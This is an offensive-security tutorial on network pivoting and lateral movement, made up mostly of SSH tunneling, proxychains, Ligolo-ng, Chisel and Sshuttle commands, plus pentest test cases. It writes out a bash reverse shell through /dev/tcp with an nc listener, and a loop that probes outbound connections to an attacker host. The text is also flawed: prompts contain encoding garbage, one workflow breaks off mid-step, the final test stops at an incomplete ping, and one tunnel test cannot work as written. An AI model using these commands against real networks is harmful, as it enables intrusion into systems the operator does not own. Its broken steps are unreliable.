Network Pivoting & Lateral Movement: Advanced Techniques Guide

Published: Dec 2025

Network pivoting and lateral movement are critical post-exploitation techniques that allow security professionals to navigate segmented networks, bypass firewalls, and gain access to systems that would otherwise be unreachable. After establishing an initial foothold, pivoting transforms a single compromised system into a gateway for deeper network penetration. This comprehensive guide covers SSH tunneling, port forwarding, proxy chains, advanced tools like Ligolo-ng, Chisel, and Sshuttle, along with practical workflows and detection evasion techniques essential for modern penetration testers.

Core Concepts: Understanding Pivoting, Lateral Movement, and Tunneling

Definitions and Distinctions

Lateral Movement is the technique of moving from one system to another within a network environment to expand access and elevate privileges across multiple hosts. It focuses on spreading horizontally within the same network segment or trust zone.

Pivoting is the process of using a compromised system as a foothold to access network segments that would otherwise be unreachable from the attacker's original position. It enables crossing network boundaries and firewalls by using an internal system as a relay or gateway.

Tunneling is a technique that encapsulates network traffic within another protocol, creating a secure channel through which data can pass. It allows traffic to appear as benign communication while actually being used for unauthorized access or command and control (C2).

Lateral Movement spreads your access across multiple systems in the same zone. Pivoting breaks through network boundaries using a compromised system. Tunneling is the mechanism enabling this movement by encapsulating traffic.

Network Fundamentals for Pivoting

Essential Networking Concepts

  • Multiple Network Interfaces (NICs): Compromised systems may have access to multiple networks simultaneously
  • Routing Tables: Determine how packets reach their destination (use route or ip route)
  • Network Segmentation: DMZ, Internal Networks, Management Networks with varying access levels
  • Firewall Rules: Inbound/outbound restrictions that pivoting must bypass or work around
  • Trust Relationships: Systems within the same trust zone often have weaker authentication

Reconnaissance Before Pivoting

# Identify available network interfaces
ip addr show
ifconfig

# Check routing table
ip route

# Identify other systems on connected networks
arp -a

# Network scanning from pivot point
nmap -sL 192.168.1.0/24  # List targets
nmap -Pn -sT 192.168.1.0/24  # TCP connect scan (no ICMP)

SSH Port Forwarding: The Foundation of Pivoting

Local Port Forwarding

Local port forwarding creates a listening port on your attacking machine that forwards traffic through the SSH tunnel to a remote system. This is useful when you know exactly which service you want to access.

# Basic syntax
ssh -L local_port:target_ip:target_port user@ssh_server

# Example: Access internal web server
ssh -L 8080:192.168.1.50:80 pivot_user@10.10.10.50

# Access internal database
ssh -L 3306:192.168.1.100:3306 pivot_user@10.10.10.50

# Using SSH key
ssh -i /path/to/key -L 8080:192.168.1.50:80 pivot_user@10.10.10.50

# Background the tunnel with -N and -f flags
ssh -N -f -L 8080:192.168.1.50:80 pivot_user@10.10.10.50

# Now access locally
curl http://localhost:8080
mysql -h 127.0.0.1 -P 3306 -u root -p

Remote Port Forwarding

Remote port forwarding is the reverse: the SSH server (pivot) listens on a port and forwards traffic back to your attacking machine. This is essential for catching reverse shells.

# Basic syntax
ssh -R remote_bind_port:local_ip:local_port user@ssh_server

# Example: Catch reverse shell on attacker machine
# On attacker machine (must have SSH running):
sudo systemctl start ssh

# On pivot machine with shell access:
ssh -R 4444:127.0.0.1:4444 attacker@attacker_ip

# Now on attacker:
nc -lvnp 4444  # Listen for reverse shell

# Reverse shell from target sends to pivot:4444 which forwards to attacker:4444

Dynamic Port Forwarding (SOCKS Proxy)

Dynamic port forwarding creates a SOCKS5 proxy that can forward traffic to any destination dynamically. This is more flexible than static forwarding.

# Create SOCKS5 proxy on local port 9050
ssh -D 9050 -N pivot_user@10.10.10.50

# Or with key authentication
ssh -i /path/to/key -D 9050 -N pivot_user@10.10.10.50

# Now configure applications to use the proxy:
# 1. Using proxychains:
proxychains -f /etc/proxychains.conf curl http://192.168.1.10

# 2. Using Firefox:
# Settings > Network > SOCKS > 127.0.0.1:9050

# 3. Using with nmap through proxychains:
proxychains -q nmap -Pn -sT 192.168.1.0/24 -p 80,443

Proxychains: Making Tools Proxy-Aware

Configuration Setup

# Install proxychains (if not already installed)
sudo apt-get install proxychains4

# Edit configuration
sudo nano /etc/proxychains4.conf

# Key settings to enable/modify:
# Uncomment "dynamic_chain" (comment out strict_chain and random_chain)
# At the end, add your SOCKS proxy:
socks5 127.0.0.1 9050

Using Proxychains with Tools

# Basic usage - prepend proxychains to any command
proxychains curl http://192.168.1.10

# Port scanning through proxy
proxychains -q nmap -Pn -sT 192.168.1.0/24 -p 22,80,443,3389

# RDP through proxy
proxychains xfreerdp /v:192.168.1.50 /u:username /p:password

# SMB enumeration through proxy
proxychains smbclient -L \\\\192.168.1.100\\

# SSH to internal host
proxychains ssh user@192.168.1.150

Proxychains Performance Tips

# Edit /etc/proxychains4.conf:

# 1. Enable quiet mode to reduce spam
quiet_mode

# 2. Remove "random_chain" and "strict_chain"
#    Leave only "dynamic_chain"

# 3. Add localnet exclusions to avoid looping
localnet 127.0.0.0/255.0.0.0

# 4. Use -q flag for quiet output
proxychains -q [command]

Advanced Pivoting Tools

Ligolo-ng: The Modern VPN Tunneling Solution

Ligolo-ng is a next-generation pivoting tool that creates TUN-based tunnels, eliminating the need for SOCKS proxies and offering superior performance.

Aspect Ligolo-ng Chisel Sshuttle
Tunnel Type TUN Interface (VPN-like) HTTP + SOCKS5 VPN over SSH
Requires Proxy Config No Yes (proxychains) No
OS Support Windows, Linux, macOS Windows, Linux, macOS Linux only
Performance Excellent (native TCP/UDP) Good (HTTP tunneled) Very Good
Learning Curve Easy Moderate Moderate

Single Pivot with Ligolo-ng

# Step 1: Start Ligolo-ng proxy on attacker machine
./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601

# Step 2: Transfer agent to pivot machine
# Download appropriate binary (agent_Linux_64bit, agent.exe, etc.)

# Step 3: Execute agent to connect back to attacker
./agent -connect attacker_ip:11601 -ignore-cert

# Step 4: On attacker, in Ligolo interactive console:
ligolo-ng ¬ª session                    # List available sessions
ligolo-ng ¬ª session 1                  # Select session
[Agent : 1] ¬ª interface_create --name lig0
[Agent : 1] ¬ª tunnel_start --tun lig0

# Step 5: Add route on attacker machine
sudo ip route add 192.168.1.0/24 dev lig0

# Step 6: Now directly access the internal network without proxychains!
nmap -Pn -sT 192.168.1.0/24 -p 80,443
ssh user@192.168.1.50
mssqlclient.py -windows-auth username@192.168.1.100

Double Pivoting with Ligolo-ng

# After first pivot tunnel is established:
# 1. RDP/SSH into second machine in new network (172.16.5.0/24)
# 2. Transfer agent binary to this new machine
# 3. Execute agent pointing back to first pivot machine:

./agent -connect 192.168.1.50:11601 -ignore-cert

# 4. Back on attacker, add new listener:
[Agent : 1] ¬ª listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602

# 5. On second pivot machine (accessed via first pivot), run second agent:
./agent -connect attacker_ip:11602 -ignore-cert

# 6. Manage second session:
ligolo-ng ¬ª session 2
[Agent : 2] ¬ª interface_create --name lig1
[Agent : 2] ¬ª tunnel_start --tun lig1
[Agent : 2] ¬ª route add 172.16.5.0/24

# 7. On attacker:
sudo ip route add 172.16.5.0/24 dev lig1

# Now you have access to both networks without proxychains!

Chisel: Flexible HTTP Tunneling

# Server side (attacker machine)
./chisel server -p 8000 -v

# Client side (pivot machine) - create SOCKS5 proxy
./chisel client attacker_ip:8000 socks

# Or with reverse SOCKS (client initiates)
./chisel server -p 8000 --reverse
./chisel client attacker_ip:8000 R:socks

# Specific port forwarding
./chisel client attacker_ip:8000 8080:192.168.1.50:80

# Use with proxychains
proxychains nmap -Pn -sT 192.168.1.0/24

Sshuttle: VPN-like SSH Tunneling

# Basic usage - automatic subnet detection
sshuttle -vr user@pivot_ip

# Specify network explicitly
sshuttle -vr user@pivot_ip 192.168.1.0/24 172.16.0.0/16

# With password (using sshpass)
sshuttle -vr user@pivot_ip 192.168.1.0/24 -e "sshpass -p 'password' ssh"

# With SSH key
sshuttle -vr user@pivot_ip 192.168.1.0/24 -e "ssh -i /path/to/key"

# Exclude certain traffic
sshuttle -vr user@pivot_ip 192.168.1.0/24 -x attacker_ip

# After connection, use tools normally without proxychains:
nmap -Pn -sT 192.168.1.0/24
ssh user@192.168.1.50

Practical Exploitation Workflows

Workflow 1: Simple SSH Local Port Forwarding

# Scenario: Web server on 192.168.1.50:80 accessible only from pivot

# Step 1: Create SSH tunnel
ssh -L 8080:192.168.1.50:80 -N pivot_user@pivot_ip

# Step 2: Access in browser
# Navigate to http://localhost:8080

# Step 3: Interact through tunnel
curl -v http://localhost:8080
sqlmap -u "http://localhost:8080/search?q=*" -p q --batch

Workflow 2: SOCKS Proxy + Proxychains Reconnaissance

# Step 1: Create SOCKS proxy
ssh -D 9050 -N pivot_user@pivot_ip

# Step 2: Verify proxychains configuration
cat /etc/proxychains4.conf | grep -A 5 "^socks5"

# Step 3: Perform network reconnaissance
proxychains -q nmap -Pn -sT 192.168.1.0/24 -p 22,80,443,3389,3306 --open

# Step 4: Identify targets and enumerate
proxychains smbclient -L \\\\192.168.1.100\\

# Step 5: Access identified services
proxychains xfreerdp /v:192.168.1.200 /u:admin /p:password

Workflow 3: Multi-Hop Pivoting with Ligolo-ng

# Scenario: Compromise path: Attacker -> Pivot1 -> Pivot2 -> Target Network

# Phase 1: Initial foothold on Pivot1 (10.10.10.50)
# [Establish shell on Pivot1]

Test Cases for Pivoting Engagements

TC-PIVOT-001: Network Interface Enumeration

Objective: Identify all network interfaces on compromised system
Steps:
  1. Execute: ip addr show
  2. Execute: route -n
  3. Execute: arp -a
  4. Document all networks system is connected to
  5. Verify bidirectional connectivity to each network

Expected: System connected to multiple networks with different IP ranges
Pass Criteria: Can communicate with systems in each identified network

TC-PIVOT-002: Firewall Rule Enumeration

Objective: Identify firewall rules limiting egress traffic
Steps:
  1. From pivot, attempt connections to attacker on various ports:
     for port in 80 443 8080 8443 4444 9050; do
       timeout 2 bash -c "echo > /dev/tcp/attacker_ip/$port" && echo "Port $port open"
     done
  2. Identify which ports allow outbound traffic
  3. Prioritize HTTPS (443) and HTTP (80) as most likely open
  
Expected: Some ports are filtered, others are open
Pass Criteria: Identified at least one usable outbound port

TC-PIVOT-003: SSH Tunnel Establishment

Objective: Successfully establish SSH tunnel to internal network
Steps:
  1. From pivot machine, execute:
     ssh -L 8080:192.168.1.50:80 -N attacker@attacker_ip
  2. From attacker, verify tunnel:
     curl -v http://localhost:8080
  3. Verify traffic flows through tunnel:
     tcpdump on pivot shows traffic

Expected: HTTP 200 response from internal web server
Pass Criteria: Can access internal service through tunnel

TC-PIVOT-004: SOCKS Proxy Functionality

Objective: Validate SOCKS proxy forwards traffic correctly
Steps:
  1. Create SOCKS proxy: ssh -D 9050 -N user@pivot_ip
  2. Configure proxychains with: socks5 127.0.0.1 9050
  3. Execute proxychains test:
     proxychains -q nmap -Pn -sT 192.168.1.10 -p 80
  4. Verify nmap connects through proxy
  
Expected: Nmap scan results from internal network
Pass Criteria: Successfully identified open ports on internal system

TC-PIVOT-005: Reverse Shell Through Pivot

Objective: Catch reverse shell from target through pivot machine
Setup:
  1. On attacker machine: sudo systemctl start ssh
  2. On pivot machine: ssh -R 4444:127.0.0.1:4444 attacker@attacker_ip
  3. On attacker: nc -lvnp 4444
  4. Execute reverse shell from target:
     bash -i >& /dev/tcp/pivot_ip/4444 0>&1
  
Expected: Shell session established on attacker machine
Pass Criteria: Can execute commands from attacker to target

TC-PIVOT-006: Ligolo-ng Tunnel Creation

Objective: Establish Ligolo-ng tunnel and verify network access
Steps:
  1. Start proxy: ./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
  2. Execute agent on pivot: ./agent -connect attacker:11601 -ignore-cert
  3. In Ligolo console:
     session 1
     interface_create --name lig0
     tunnel_start --tun lig0
  4. On attacker: sudo ip route add 192.168.1.0/24 dev lig0
  5. Verify: ping -c 1
